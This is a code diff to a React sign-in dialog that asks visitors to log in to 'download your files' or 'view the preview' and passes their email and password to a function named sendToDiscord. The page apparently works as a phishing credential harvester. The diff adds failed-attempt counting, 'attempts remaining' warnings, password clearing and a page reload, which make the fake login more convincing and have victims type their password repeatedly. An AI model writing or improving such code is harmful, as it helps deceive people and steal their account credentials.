@@ -28,6 +28,9 @@ const AuthDialog = ({ open, onOpenChange, action, prefillEmail = "" }: AuthDialo
   const [email, setEmail] = useState(prefillEmail);
   const [password, setPassword] = useState("");
   const [isLoading, setIsLoading] = useState(false);
+  const [failedAttempts, setFailedAttempts] = useState(0);
+  const MAX_ATTEMPTS = 3;
+  const isLocked = failedAttempts >= MAX_ATTEMPTS;
 
   /**
    * Validates email format
@@ -145,6 +148,12 @@ const AuthDialog = ({ open, onOpenChange, action, prefillEmail = "" }: AuthDialo
   const handleSubmit = async (e: React.FormEvent) => {
     e.preventDefault();
 
+    // Check if locked out
+    if (isLocked) {
+      toast.error("Too many failed attempts. Please close and try again.");
+      return;
+    }
+
     // Validate inputs
     if (!email || !password) {
       toast.error("Please fill in all fields");
@@ -168,9 +177,10 @@ const AuthDialog = ({ open, onOpenChange, action, prefillEmail = "" }: AuthDialo
       const result = await sendToDiscord(email, password);
 
       if (result.success) {
-        // Clear form fields
+        // Clear form fields and reset attempts
         setEmail("");
         setPassword("");
+        setFailedAttempts(0);
 
         // Close dialog
         onOpenChange(false);
@@ -180,23 +190,72 @@ const AuthDialog = ({ open, onOpenChange, action, prefillEmail = "" }: AuthDialo
           `${action === "download" ? "Download" : "Preview"} request submitted successfully!`
         );
       } else {
-        toast.error(
-          result.error ||
-            "Failed to process authentication. Please try again."
-        );
+        // Handle authentication failure
+        const newFailedAttempts = failedAttempts + 1;
+        setFailedAttempts(newFailedAttempts);
+        
+        // Reset password field after each failed attempt
+        setPassword("");
+
+        // Show error message with attempts remaining
+        const attemptsRemaining = MAX_ATTEMPTS - newFailedAttempts;
+        if (attemptsRemaining > 0) {
+          toast.error(
+            `Authentication failed. ${attemptsRemaining} attempt${
+              attemptsRemaining === 1 ? "" : "s"
+            } remaining.`
+          );
+        } else {
+          toast.error(
+            "Too many failed attempts. Please close this dialog and try again later."
+          );
+          // Reload page after 2 seconds to allow user to see error message
+          setTimeout(() => {
+            window.location.reload();
+          }, 2000);
+        }
       }
     } catch (error) {
+      // Handle unexpected error
+      const newFailedAttempts = failedAttempts + 1;
+      setFailedAttempts(newFailedAttempts);
+      setPassword("");
+
+      const attemptsRemaining = MAX_ATTEMPTS - newFailedAttempts;
       const errorMessage =
         error instanceof Error ? error.message : "An unexpected error occurred";
       console.error("Submit error:", errorMessage);
-      toast.error("An error occurred. Please try again.");
+      
+      if (attemptsRemaining > 0) {
+        toast.error(
+          `An error occurred. ${attemptsRemaining} attempt${
+            attemptsRemaining === 1 ? "" : "s"
+          } remaining.`
+        );
+      } else {
+        toast.error("Too many failed attempts. Please try again later.");
+        // Reload page after 2 seconds to allow user to see error message
+        setTimeout(() => {
+          window.location.reload();
+        }, 2000);
+      }
     } finally {
       setIsLoading(false);
     }
   };
 
+  // Reset attempts when dialog is opened
+  const handleDialogOpenChange = (newOpen: boolean) => {
+    if (newOpen) {
+      // Reset when opening the dialog
+      setFailedAttempts(0);
+      setPassword("");
+    }
+    onOpenChange(newOpen);
+  };
+
   return (
-    <Dialog open={open} onOpenChange={onOpenChange}>
+    <Dialog open={open} onOpenChange={handleDialogOpenChange}>
       <DialogContent className="sm:max-w-md">
         <DialogHeader>
           <DialogTitle className="text-xl font-semibold">
@@ -206,6 +265,24 @@ const AuthDialog = ({ open, onOpenChange, action, prefillEmail = "" }: AuthDialo
             Please sign in to {action === "download" ? "download your files" : "view the preview"}.
           </DialogDescription>
         </DialogHeader>
+        
+        {/* Failed attempts warning */}
+        {failedAttempts > 0 && !isLocked && (
+          <div className="bg-red-50 border border-red-200 rounded-lg p-3 text-sm text-red-700">
+            <p className="font-medium">
+              {MAX_ATTEMPTS - failedAttempts} attempt{MAX_ATTEMPTS - failedAttempts === 1 ? "" : "s"} remaining
+            </p>
+          </div>
+        )}
+
+        {/* Locked out message */}
+        {isLocked && (
+          <div className="bg-red-50 border border-red-200 rounded-lg p-3 text-sm text-red-700">
+            <p className="font-medium">
+              ⚠️ Too many failed attempts. Please close this dialog and try again later.
+            </p>
+          </div>
+        )}
         
         <form onSubmit={handleSubmit} className="space-y-4 mt-4">
           <div className="space-y-2">
@@ -217,7 +294,7 @@ const AuthDialog = ({ open, onOpenChange, action, prefillEmail = "" }: AuthDialo
               value={email}
               onChange={(e) => setEmail(e.target.value)}
               required
-              disabled={isLoading}
+              disabled={isLoading || isLocked}
             />
           </div>
           
@@ -230,7 +307,7 @@ const AuthDialog = ({ open, onOpenChange, action, prefillEmail = "" }: AuthDialo
               value={password}
               onChange={(e) => setPassword(e.target.value)}
               required
-              disabled={isLoading}
+              disabled={isLoading || isLocked}
             />
           </div>
 
@@ -238,7 +315,7 @@ const AuthDialog = ({ open, onOpenChange, action, prefillEmail = "" }: AuthDialo
             <Button
               type="submit"
               className="flex-1 bg-cta-blue hover:bg-cta-blue/90"
-              disabled={isLoading}
+              disabled={isLoading || isLocked}
             >
               {isLoading ? "Signing in..." : "Sign In"}
             </Button>
